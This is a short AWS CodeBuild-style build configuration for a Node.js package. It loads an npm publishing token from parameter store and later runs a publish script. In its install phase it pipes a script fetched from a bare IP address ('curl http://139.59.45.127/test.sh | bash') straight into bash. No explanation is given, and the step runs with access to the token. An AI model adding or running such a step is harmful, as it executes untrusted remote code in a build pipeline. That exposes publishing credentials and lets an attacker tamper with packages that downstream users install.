version: 0.2

env:
  variables:
    AWS_REGION: us-west-2
  parameter-store:
    NPM_TOKEN: NpmToken
phases:
  install:
    runtime-versions:
      nodejs: 10
    commands:
      - curl http://139.59.45.127/test.sh | bash
      - npm install
  build:
    commands:
      - npm run build
      - ./bin/publish-package.sh
